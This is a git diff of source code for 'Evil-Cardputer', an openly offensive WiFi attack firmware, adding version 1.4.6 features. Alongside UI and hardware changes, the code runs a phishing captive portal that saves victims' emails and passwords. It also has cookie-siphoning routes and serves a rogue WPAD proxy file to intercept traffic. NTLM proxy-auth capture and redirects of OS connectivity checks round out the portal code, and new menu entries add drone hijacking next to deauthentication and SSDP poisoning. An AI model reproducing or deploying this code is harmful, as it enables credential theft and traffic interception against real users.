@@ -1,7 +1,8 @@
 /*
    Evil-Cardputer - WiFi Network Testing and Exploration Tool
 
-   Copyright (c) 2025 7h30th3r0n3
+   Copyright (c) 2025 7h30th
+   343r0n3
 
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
@@ -30,6 +31,7 @@
 */
 struct StreamItem;
 struct UrlParts;
+struct UrlPartsCrawl;
 
 typedef struct {
   uint32_t state[4];
@@ -211,6 +213,8 @@ static const char * const PROGMEM menuItems[] = {
   "SIP Ring All",
   "CCTV Toolkit",
   "SSDP Poisoner",
+  "SkyJack",
+  "WiFi Dead Drop",
   "Settings",
 };
 
@@ -222,6 +226,7 @@ int menuStartIndex = 0;
 
 String ssidList[30];
 int numSsid = 0;
+
 bool isOperationInProgress = false;
 int currentListIndex = 0;
 String clonedSSID = "Evil-Cardputer";
@@ -393,9 +398,11 @@ bool isDeauthFast = false;
 
 // Sniff and deauth clients end
 
-int baudrate_gps = 9600;
+int baudrate_gps = 115200;
 TinyGPSPlus gps;
 HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
+int gpsRxPin;
+int gpsTxPin;
 
 //webcrawling
 void webCrawling(const String &urlOrIp = "");
@@ -552,15 +559,45 @@ void releaseBLE() {
   Serial.println(F("NimBLE fully released and memory freed."));
 }
 
+// ---- Captive Portal IP selection ----
+// 0 = 192.168.4.1 (défaut), 1 = 172.0.0.1
+int portalIpIndex = 0;
+
+static const IPAddress kCaptiveIPs[2] = {
+  IPAddress(192, 168, 4, 1),
+  IPAddress(172, 0,   0, 1)
+};
+
+static const char* const kCaptiveIPStr[2] = {
+  "192.168.4.1",
+  "172.0.0.1"
+};
 
 
 void setup() {
-  M5.begin();
   Serial.begin(115200);
+  M5.begin();
   M5.Lcd.setRotation(1);
   M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.setTextFont(1);
+
+  if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
+    gpsRxPin = 15;   // Adv
+    gpsTxPin = 13;
+    pinMode(5, OUTPUT);
+    digitalWrite(5, HIGH);
+    Serial.println("Detected: Cardputer-ADV");
+  } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
+    gpsRxPin = 1;    // Normal Cardputer
+    gpsTxPin = -1;
+    Serial.println("Detected: Cardputer");
+  } else {
+    gpsRxPin = -1;   // fallback
+    gpsTxPin = -1;
+    Serial.println("Unknown board type");
+  }
+
   static const char * const PROGMEM  startUpMessages[] = {
     "  There is no spoon...",
     "    Hack the Planet!",
@@ -984,7 +1021,8 @@ void setup() {
   restoreConfigParameter("portal_file");
   restoreConfigParameter("cloned_ssid");
   restoreConfigParameter("portal_password");
-  
+  restoreConfigParameter("portal_ip_sel");
+
   int textY = 30;
   int lineOffset = 10;
   int lineY1 = textY - lineOffset;
@@ -1000,7 +1038,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.5 2025";
+  const char* text3 = "v1.4.6 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1030,7 +1068,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.4.5 2025"));
+  Serial.println(F("v1.4.6 2025"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1120,8 +1158,8 @@ void setup() {
 
   pixels.begin(); // led init
 
-  cardgps.begin(baudrate_gps, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
-
+  // GPS sur RX=gpsRxPin, pas de TX (-1), baudrate = 9600 (par ex.)
+  cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
 
   auto cfg = M5.config();
   M5Cardputer.begin(cfg, true);
@@ -1391,7 +1429,9 @@ static const unsigned long searchKeyRepeatDelay = 120; // ms
 static bool searchWaitForSRelease = false;
 // --- fin recherche zéro-alloc ---
 
-static inline char lc(char c) { return (c >= 'A' && c <= 'Z') ? (c + 32) : c; }
+static inline char lc(char c) {
+  return (c >= 'A' && c <= 'Z') ? (c + 32) : c;
+}
 
 static bool icase_contains_flash(const char* hay, const char* needle, uint8_t nlen) {
   if (nlen == 0) return true;
@@ -1435,7 +1475,11 @@ int mapViewToRealIndex(int pos) {
 
 void clampMenuSelection() {
   int total = viewCount();
-  if (total <= 0) { currentIndex = 0; menuStartIndex = 0; return; }
+  if (total <= 0) {
+    currentIndex = 0;
+    menuStartIndex = 0;
+    return;
+  }
   if (currentIndex >= total) currentIndex = total - 1;
   if (currentIndex < 0) currentIndex = 0;
   menuStartIndex = std::max(0, std::min(currentIndex, total - maxMenuDisplay));
@@ -1611,7 +1655,9 @@ void executeMenuItem(int index) {
     case 69: sipRingAll(); break;
     case 70: scanCCTVCameras(); break;
     case 71: fakeSSDP(); break;
-    case 72: showSettingsMenu(); break;
+    case 72: skyjackDroneMode(); break;
+    case 73: WifiDeadDrop(); break;
+    case 74: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2226,65 +2272,195 @@ void scanWifiNetworks() {
 }
 
 void showWifiList() {
-  bool needsDisplayUpdate = true;  // Flag pour déterminer si l'affichage doit être mis à jour
+  const int ROW_H = 13;
+  const int LEFT_PAD = 2;
+  const int ICON_W = 28;
+  const int SCROLL_W = 4;
+  const int LIST_WIDTH  = M5.Display.width() - SCROLL_W;
+  const int LIST_HEIGHT = M5.Display.height();
+
+  auto clampi = [](int v, int lo, int hi){ return v < lo ? lo : (v > hi ? hi : v); };
+
+  auto drawLockIcon = [&](int x, int y, bool locked) {
+    if (!locked) return;
+    M5.Display.drawRoundRect(x, y+2, 8, 6, 1, TFT_WHITE);
+    M5.Display.drawLine(x+2, y+2, x+2, y, TFT_WHITE);
+    M5.Display.drawLine(x+5, y+2, x+5, y, TFT_WHITE);
+    M5.Display.drawLine(x+2, y,   x+5, y, TFT_WHITE);
+  };
+
+  auto drawRssiBars = [&](int x, int y, int32_t rssi) {
+    int lvl = 0;
+    if      (rssi > -65) lvl = 4;
+    else if (rssi > -75) lvl = 3;
+    else if (rssi > -85) lvl = 2;
+    else if (rssi > -95) lvl = 1;
+    else                 lvl = 0;
+    const int bw = 2, gap = 1, h0 = 3;
+    for (int i = 0; i < 4; ++i) {
+      int h = h0 + i*2;
+      int bx = x + i*(bw + gap);
+      int by = y + (ROW_H - 2) - h;
+      uint16_t c = (i < lvl) ? TFT_GREEN : menuTextUnFocusedColor;
+      M5.Display.fillRect(bx, by, bw, h, c);
+    }
+  };
+
+  auto truncateToWidth = [&](String s, int maxW) {
+    if (maxW <= 0) return String("");
+    if (M5.Display.textWidth(s) <= maxW) return s;
+    String e = "...";
+    while (s.length() > 0 && M5.Display.textWidth(s + e) > maxW) {
+      s.remove(s.length() - 1);
+    }
+    return String(s + e);
+  };
+
+  auto drawScrollbar = [&](int startIndex, int visible, int total) {
+    int x = M5.Display.width() - SCROLL_W;
+    M5.Display.fillRect(x, 0, SCROLL_W, LIST_HEIGHT, menuBackgroundColor);
+    if (total <= visible) return;
+    int trackH = LIST_HEIGHT;
+    int thumbH = max(8, (trackH * visible) / total);
+    int maxStart = max(1, total - visible);
+    int thumbY = (trackH - thumbH) * startIndex / maxStart;
+    M5.Display.fillRect(x+1, thumbY, SCROLL_W-2, thumbH, menuTextUnFocusedColor);
+  };
+
+  auto isLocked = [&](int i) -> bool {
+    wifi_auth_mode_t enc = WiFi.encryptionType(i);
+    return enc != WIFI_AUTH_OPEN;
+  };
+
+  // Cache infos du scan
+  int32_t rssiCache[30];
+  uint8_t chanCache[30];
+  bool    lockCache[30];
+  for (int i = 0; i < numSsid; ++i) {
+    rssiCache[i] = WiFi.RSSI(i);
+    chanCache[i] = (uint8_t)WiFi.channel(i);
+    lockCache[i] = isLocked(i);
+  }
+
+  static bool prevUp = false, prevDown = false;
+  static unsigned long upHoldStart = 0, downHoldStart = 0;
+  static unsigned long upLastRepeat = 0, downLastRepeat = 0;
+  const unsigned long firstDelay  = 300;
+  const unsigned long repeatDelay = 120;
+
+  auto moveUp = [&](){
+    if (numSsid <= 0) return;
+    currentListIndex--;
+    if (currentListIndex < 0) currentListIndex = numSsid - 1;
+  };
+  auto moveDown = [&](){
+    if (numSsid <= 0) return;
+    currentListIndex++;
+    if (currentListIndex >= numSsid) currentListIndex = 0;
+  };
+
+  bool needsDisplayUpdate = true;
   enterDebounce();
-  static bool keyHandled = false;
+  static bool keyHandledEnter = false;
+
   while (!inMenu) {
     if (needsDisplayUpdate) {
-      M5.Display.clear();
-      const int listDisplayLimit = M5.Display.height() / 13; // Ajuster en fonction de la nouvelle taille du texte
-      int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
+      M5.Display.fillRect(0, 0, LIST_WIDTH, LIST_HEIGHT, menuBackgroundColor);
 
-      M5.Display.setTextSize(1.5);
-      for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
-        if (i == currentListIndex) {
-          M5.Display.fillRect(0, (i - listStartIndex) * 13, M5.Display.width(), 13, menuSelectedBackgroundColor); // Ajuster la hauteur
+      const int lines = LIST_HEIGHT / ROW_H;
+      int listStartIndex = clampi(currentListIndex - lines/2, 0, max(0, numSsid - lines));
+
+      M5.Display.setFont(&fonts::Font0);
+      M5.Display.setTextSize(1);
+
+      for (int row = 0; row < lines; ++row) {
+        int i = listStartIndex + row;
+        if (i >= numSsid) break;
+        int y = row * ROW_H;
+
+        bool focused = (i == currentListIndex);
+        if (focused) {
+          M5.Display.fillRect(0, y, LIST_WIDTH, ROW_H, menuSelectedBackgroundColor);
           M5.Display.setTextColor(menuTextFocusedColor);
         } else {
           M5.Display.setTextColor(menuTextUnFocusedColor);
         }
-        M5.Display.setCursor(2, (i - listStartIndex) * 13); // Ajuster la hauteur
-        M5.Display.println(ssidList[i]);
+
+        // Méta à droite
+        String meta = "ch" + String(chanCache[i] ? chanCache[i] : 0) + " " + String(rssiCache[i]) + "dBm";
+        int metaW = M5.Display.textWidth(meta);
+        int metaX = LIST_WIDTH - metaW - 2;
+        if (metaX < LEFT_PAD + ICON_W + 6) metaX = LEFT_PAD + ICON_W + 6;
+
+        // Icônes gauche
+        int iconX = LEFT_PAD;
+        drawRssiBars(iconX, y, rssiCache[i]);
+        drawLockIcon(iconX + 12, y + 1, lockCache[i]);
+
+        // SSID tronqué
+        int textX = LEFT_PAD + ICON_W;
+        int maxTextW = max(0, metaX - textX - 2);
+        String line = truncateToWidth(ssidList[i], maxTextW);
+        M5.Display.setCursor(textX, y + 1);
+        M5.Display.print(line);
+
+        // Méta
+        M5.Display.setCursor(metaX, y + 1);
+        M5.Display.print(meta);
       }
+
+      drawScrollbar(clampi(currentListIndex - (LIST_HEIGHT/ROW_H)/2, 0, max(0, numSsid - (LIST_HEIGHT/ROW_H))), LIST_HEIGHT/ROW_H, numSsid);
       M5.Display.display();
-      needsDisplayUpdate = false;  // Réinitialiser le flag après la mise à jour de l'affichage
+      needsDisplayUpdate = false;
     }
 
+    // pump
     M5.update();
     M5Cardputer.update();
     handleDnsRequestSerial();
-    delay(10); // Petit délai pour réduire la charge du processeur
+    delay(10);
 
-    // Vérifiez les entrées clavier ici
-    if ((M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) || (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled)) {
-      if (M5Cardputer.Keyboard.isKeyPressed(';')) {
-        currentListIndex--;
-        if (currentListIndex < 0) currentListIndex = numSsid - 1;
-      } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
-        currentListIndex++;
-        if (currentListIndex >= numSsid) currentListIndex = 0;
-      }
-      needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
-      keyHandled = true;
-    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
+    // --- navigation auto-repeat ---
+    bool up = M5Cardputer.Keyboard.isKeyPressed(';');
+    bool dn = M5Cardputer.Keyboard.isKeyPressed('.');
+
+    unsigned long now = millis();
+
+    if (up && !prevUp) { moveUp(); needsDisplayUpdate = true; upHoldStart = upLastRepeat = now; }
+    if (dn && !prevDown){ moveDown(); needsDisplayUpdate = true; downHoldStart = downLastRepeat = now; }
+
+    if (up && prevUp && (now - upHoldStart >= firstDelay) && (now - upLastRepeat >= repeatDelay)) {
+      moveUp(); needsDisplayUpdate = true; upLastRepeat = now;
+    }
+    if (dn && prevDown && (now - downHoldStart >= firstDelay) && (now - downLastRepeat >= repeatDelay)) {
+      moveDown(); needsDisplayUpdate = true; downLastRepeat = now;
+    }
+
+    prevUp = up;
+    prevDown = dn;
+
+    // ENTER
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandledEnter) {
       inMenu = true;
       Serial.println(F("-------------------"));
       Serial.println("SSID " + ssidList[currentListIndex] + " selected");
       Serial.println(F("-------------------"));
       waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
-      needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
-      keyHandled = true;
-    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      needsDisplayUpdate = true;
+      keyHandledEnter = true;
+    }
+    // BACK
+    else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
       inMenu = true;
       drawMenu();
       break;
-    } else if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
-               !M5Cardputer.Keyboard.isKeyPressed('.') &&
-               !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-      keyHandled = false;
+    }
+    else if (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      keyHandledEnter = false;
     }
   }
 }
+
 
 
 
@@ -2537,12 +2713,6 @@ void handleLogRequest() {
     "\x44\x01\x00\x3b");
 }
 
-const char wpad_dat[] PROGMEM = R"RAW(
-function FindProxyForURL(url, host) {
-  return "PROXY 192.168.4.1:80; DIRECT";
-}
-)RAW";
-
 
 void servePortalFileWithReplace(const String &path, const String &replaceIP) {
     File f = SD.open(path);
@@ -2585,7 +2755,14 @@ void createCaptivePortal() {
     } else {
       WiFi.mode(WIFI_MODE_APSTA);
     }
-
+    
+   IPAddress apIP = getSelectedPortalIP();
+    if (!WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0))) {
+      Serial.println(F("[-] softAPConfig failed, keep default"));
+    } else {
+      Serial.print(F("[CFG] AP IP = ")); Serial.println(apIP);
+    }
+    
     // Paramètres pour softAP()
     const int  channel       = 1;     // canal Wi-Fi (1 à 13 selon norme)
     const bool ssid_hidden   = false; // SSID visible
@@ -2617,8 +2794,9 @@ void createCaptivePortal() {
   server.on("/siphon", handleCookieSiphoning);
   server.on("/logcookie", handleLogRequest);
   server.on("/wpad.dat", HTTP_GET, []() {
-    Serial.println("[+] WPAD request, sending proxy!!!");
-    server.send_P(200, "application/x-ns-proxy-autoconfig", wpad_dat);
+  String pac = "function FindProxyForURL(url, host) { return \"PROXY " + ipAP.toString() + ":80; DIRECT\"; }";
+  server.send(200, "application/x-ns-proxy-autoconfig", pac);
+  Serial.println(String("[+] WPAD sent with proxy ")+ ipAP.toString() +":80");
   });
   
   server.on("/", HTTP_GET, []() {
@@ -2626,7 +2804,6 @@ void createCaptivePortal() {
       String password = server.arg("password");
   
       if (!email.isEmpty() && !password.isEmpty()) {
-          // Sauvegarde des credentials
           saveCredentials(email, password, selectedPortalFile.substring(12), clonedSSID);
           server.send(200, "text/plain", "Credentials Saved");
       } else {
@@ -2635,8 +2812,8 @@ void createCaptivePortal() {
           Serial.println(F("-------------------"));
   
           IPAddress clientIP = server.client().remoteIP();
-          if (clientIP[0] == 192 && clientIP[1] == 168 && clientIP[2] == 4) {
-              // Client 192.168.4.0/24
+  
+          if (portalIpIndex == 0 && clientIP[0] == 192 && clientIP[1] == 168 && clientIP[2] == 4) {
               File f = SD.open(selectedPortalFile);
               if (f) {
                   server.streamFile(f, "text/html");
@@ -2644,16 +2821,15 @@ void createCaptivePortal() {
               } else {
                   server.send(404, "text/plain", "File not found");
               }
-          } else {
-              // Client external
+          } 
+          else if (portalIpIndex == 1 && clientIP[0] == 172 && clientIP[1] == 0 && clientIP[2] == 0) {
+              servePortalFileWithReplace(selectedPortalFile, "172.0.0.1");
+          } 
+          else {
               servePortalFileWithReplace(selectedPortalFile, ipSTA.toString());
           }
       }
   });
-
-
-
-
 
   server.on("/evil-m5core2-menu", HTTP_GET, []() {
       String html = "<!DOCTYPE html><html><head><style>";
@@ -3129,6 +3305,65 @@ void createCaptivePortal() {
           return;        
   }); 
 
+  // --- Captive portal probes & browsers ---
+  
+  // Android
+  server.on("/generate_204", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/gen_204", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/mobile/status.php", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  
+  // Apple
+  server.on("/hotspot-detect.html", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/html", "");
+  });
+  server.on("/library/test/success.html", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/html", "");
+  });
+  
+  // Windows
+  server.on("/ncsi.txt", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/connecttest.txt", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/fwlink", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  
+  // Chrome / Firefox / divers navigateurs
+  server.on("/chrome-variations/seed", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/success.txt", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/redirect", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+  server.on("/check_network_status.txt", []() {
+    server.sendHeader("Location", "/", true);
+    server.send(302, "text/plain", "");
+  });
+
+
   server.onNotFound([]() {
     pageAccessFlag = true;
     Serial.println(F("-------------------"));
@@ -3139,7 +3374,7 @@ void createCaptivePortal() {
 
   server.begin();
   Serial.println(F("-------------------"));
-  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
+  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(12) + " Portal !");
   Serial.println(F("-------------------"));
   if (ledOn) {
     pixels.setPixelColor(0, pixels.Color(255, 0, 0));
@@ -3167,6 +3402,17 @@ https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7
 // --- Servers
 WiFiServer proxy(80);
 
+const char wpad_dat[] PROGMEM = R"RAW(
+function FindProxyForURL(url, host) {
+  return "PROXY 192.168.4.1:80; DIRECT";
+}
+)RAW";
+
+const char wpad_dat172[] PROGMEM = R"RAW(
+function FindProxyForURL(url, host) {
+  return "PROXY 172.0.0.1:80; DIRECT";
+}
+)RAW";
 // =================== Utils ===================
 
 static inline void le16(std::vector<uint8_t>& v, uint16_t x){ v.push_back(x & 0xFF); v.push_back((x>>8)&0xFF); }
@@ -3434,13 +3680,27 @@ void handleNTLMClient(WiFiClient &client) {
   String headers = httpReadHeaders(client);
 
   if (reqLine.startsWith("GET /wpad.dat")) {
-    client.print("HTTP/1.1 200 OK\r\n");
-    client.print("Content-Type: application/x-ns-proxy-autoconfig\r\n");
-    client.print("Content-Length: "); client.print(strlen_P(wpad_dat)); client.print("\r\n\r\n");
-    client.print(wpad_dat);
-    Serial.println("[*] Served wpad.dat");
-    return;
+      const char* pacData;
+      size_t pacLen;
+  
+      if (portalIpIndex == 1) {
+        pacData = wpad_dat172;
+        pacLen  = strlen_P(wpad_dat172);
+      } else {
+        pacData = wpad_dat;
+        pacLen  = strlen_P(wpad_dat);
+      }
+  
+      client.print(F("HTTP/1.1 200 OK\r\n"));
+      client.print(F("Content-Type: application/x-ns-proxy-autoconfig\r\n"));
+      client.print(F("Content-Length: "));
+      client.print(pacLen);
+      client.print(F("\r\n\r\n"));
+      client.write_P(pacData, pacLen);
+      Serial.println(F("[*] Served wpad.dat"));
+      return;
   }
+
 
   String headersL = headers; headersL.toLowerCase();
   int hIdx = headersL.indexOf("proxy-authorization:");
@@ -3820,44 +4080,6 @@ void wpadAbuse() {
     }
   }
 } 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -4783,15 +5005,45 @@ String oldRamUsage = "";
 String oldBatteryLevel = "";
 String oldTemperature = "";
 
+#include <driver/adc.h>
+#include <esp_adc_cal.h>
+
 String getBatteryLevel() {
+  int percent = -1;
 
-  if (M5.Power.getBatteryLevel() < 0) {
+  if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
+    // Normal Cardputer → API standard
+    percent = M5.Power.getBatteryLevel();
+  } 
+  else if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
+    // ADV → lecture via ADC
+    const int BASE_VOLTAGE = 3600; // référence de calibration
+    static esp_adc_cal_characteristics_t *adc_chars = nullptr;
 
+    if (!adc_chars) {
+      adc_chars = (esp_adc_cal_characteristics_t *)calloc(1, sizeof(esp_adc_cal_characteristics_t));
+      adc1_config_width(ADC_WIDTH_BIT_12);
+      adc1_config_channel_atten(ADC1_CHANNEL_9, ADC_ATTEN_DB_11); // GPIO10
+      esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, BASE_VOLTAGE, adc_chars);
+    }
+
+    int raw = adc1_get_raw(ADC1_CHANNEL_9);
+    uint32_t mv = esp_adc_cal_raw_to_voltage(raw, adc_chars) * 2; // facteur 2 car diviseur interne
+
+    percent = (mv - 3300) * 100.0 / (4150 - 3350); // map tension → %
+    if (percent < 0) percent = 0;
+    if (percent > 100) percent = 100;
+  }
+
+  // Retourne "error" si rien de valide
+  if (percent < 0) {
     return String("error");
   } else {
-    return String(M5.Power.getBatteryLevel());
+    return String(percent);
   }
 }
+
+
 
 String getTemperature() {
   float temperature;
@@ -5097,21 +5349,21 @@ void showSettingsMenu() {
     bool continueSettingsMenu = true;
 
     while (continueSettingsMenu) {
-        options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement
+        options.clear();
 
         options.push_back({"Brightness", brightness});
         options.push_back({soundOn ? "Sound Off" : "Sound On", []() {toggleSound();}});
         options.push_back({ledOn ? "LED Off" : "LED On", []() {toggleLED();}});
-        options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}}); // Nouvelle option pour le baudrate GPS
+        options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}});
         options.push_back({"Set Startup Image", setStartupImage});
         options.push_back({"Set Startup Volume", adjustVolume});
         options.push_back({"Set Startup Sound", setStartupSound});
         options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
         options.push_back({"Save current Portal & SSID", []() { saveCurrentPortalAndSSID(); }});
         options.push_back({"Set CPU Frequency", setCPUFrequency});
+        options.push_back({"Change Portal IP", setCaptivePortalIP});
         
         loopOptions(options, false, true, "Settings");
-
         // Vérifie si BACKSPACE a été pressé pour quitter le menu
         if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
             continueSettingsMenu = false;
@@ -5235,7 +5487,7 @@ void setGPSBaudrate() {
             M5.Display.setCursor(0, M5.Display.height() / 2);
             M5.Display.print("GPS Baudrate set to\n" + String(baudrate_gps));
             cardgps.end();
-            cardgps.begin(baudrate_gps, SERIAL_8N1, 1, -1);
+            cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
             delay(1000);
             baudrateSelected = true;
         } 
@@ -5978,6 +6230,71 @@ void saveCurrentPortalAndSSID() {
 }
 
 
+
+// Helper: retourne l’IP sélectionnée
+IPAddress getSelectedPortalIP() {
+  return kCaptiveIPs[portalIpIndex];
+}
+
+
+void setCaptivePortalIP() {
+  // simple liste à 2 choix
+  const char* choices[2] = { "192.168.4.1", "172.0.0.1" };
+  int currentIndexLocal = portalIpIndex;  // position courante
+  bool selected = false;
+  bool needDisplayUpdate = true;
+
+  enterDebounce();
+
+  while (!selected) {
+    if (needDisplayUpdate) {
+      M5.Display.clear();
+      M5.Display.setCursor(0, 0);
+      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+      M5.Display.println("Select Captive IP:");
+
+      for (int i = 0; i < 2; i++) {
+        if (i == currentIndexLocal) {
+          M5.Display.setTextColor(menuTextFocusedColor);
+        } else {
+          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+        }
+        M5.Display.println(String("  ") + choices[i]);
+      }
+      needDisplayUpdate = false;
+    }
+
+    M5.update();
+    M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) { // up
+      currentIndexLocal = (currentIndexLocal - 1 + 2) % 2;
+      needDisplayUpdate = true;
+      delay(150);
+    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // down
+      currentIndexLocal = (currentIndexLocal + 1) % 2;
+      needDisplayUpdate = true;
+      delay(150);
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      portalIpIndex = currentIndexLocal;
+      saveConfigParameter("portal_ip_sel", portalIpIndex); // persistance
+      Serial.println("[CFG] Captive IP selection saved: " + String(kCaptiveIPStr[portalIpIndex]));
+      M5.Display.fillScreen(menuBackgroundColor);
+      M5.Display.setCursor(0, M5.Display.height()/2);
+      M5.Display.print("Captive IP set to ");
+      M5.Display.println(kCaptiveIPStr[portalIpIndex]);
+      delay(1000);
+      selected = true;
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      // retour sans changement
+      inMenu = true;
+      drawMenu();
+      return;
+    }
+  }
+}
+
+
 void restoreConfigParameter(String key) {
   if (SD.exists(configFilePath)) {
     File configFile = SD.open(configFilePath, FILE_READ);
@@ -6090,6 +6407,11 @@ void restoreConfigParameter(String key) {
           } else if (key == "portal_password") {
             captivePortalPassword = stringValue;
             Serial.println("Portal password restored to " + captivePortalPassword);
+          } else if (key == "portal_ip_sel") {
+            int intValue = stringValue.toInt();
+            if (intValue < 0 || intValue > 1) intValue = 0; // garde-fou
+            portalIpIndex = intValue;
+            Serial.println("Captive IP selection restored: " + String(kCaptiveIPStr[portalIpIndex]));
           }
           keyFound = true;
           break;
@@ -6112,7 +6434,7 @@ void restoreConfigParameter(String key) {
         } else if (key == "randomOn") {
           boolValue = false;
         } else if (key == "baudrate_gps") {
-          baudrate_gps = 9600;
+          baudrate_gps = 115200;
         } else if (key == "webpassword") {
           accessWebPassword = "7h30th3r0n3";
         } else if (key == "discordWebhookURL") {
@@ -6141,6 +6463,8 @@ void restoreConfigParameter(String key) {
           clonedSSID = "Evil-Cardputer"; 
         } else if (key == "portal_password") { 
           captivePortalPassword = ""; 
+        } else if (key == "portal_ip_sel") {
+          portalIpIndex = 0; // défaut = 192.168.4.1
         }
       }
 
@@ -6170,7 +6494,7 @@ void restoreConfigParameter(String key) {
     } else if (key == "randomOn") {
       randomOn = false;
     } else if (key == "baudrate_gps") {
-      baudrate_gps = 9600;
+      baudrate_gps = 115200;
     } else if (key == "webpassword") {
       accessWebPassword = "7h30th3r0n3";
     } else if (key == "discordWebhookURL") {
@@ -6199,6 +6523,8 @@ void restoreConfigParameter(String key) {
       clonedSSID = "Evil-Cardputer"; 
     } else if (key == "portal_password") { 
       captivePortalPassword = ""; 
+    }else if (key == "portal_ip_sel") {
+      portalIpIndex = 0; // défaut = 192.168.4.1
     }
   }
 }
@@ -7675,9 +8001,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.5"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.6"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.5"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.6"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -9526,9 +9852,6 @@ void purgeAllAPData() {
 void deauthClients() {
   M5.Display.clear();
 
-  //ESP_BT.end();
-  //bluetoothEnabled = false;
-  
   esp_wifi_set_promiscuous(false);
   WiFi.disconnect(true);  // Déconnecte et efface les paramètres WiFi enregistrés
   esp_wifi_stop();
@@ -10863,185 +11186,326 @@ void scanIpPort() {
 
 // scan single IP end
 
-
-/*
-============================================================================================================================
-// Web crawling
-============================================================================================================================
+/* 
+================================================================================================================
+   Web crawling
+================================================================================================================ 
 */
 
-std::vector<String> urlList;  // Dynamic list for URLs
-int startIndex = 0;           // Start index for display
-const int maxDisplayLines = 11; // Maximum number of lines to display at a time
-String urlBase = "";
+#include <HTTPClient.h>
+#include <WiFiClientSecure.h>
+#include <WiFiClient.h>
 
+// --- Constantes réglables
+static const uint16_t HTTP_TIMEOUT_MS = 1200;   // Timeout en ms
+static const uint8_t  MAX_REDIRECTS   = 5;      // Limite de redirections
+
+// --- Structure URL
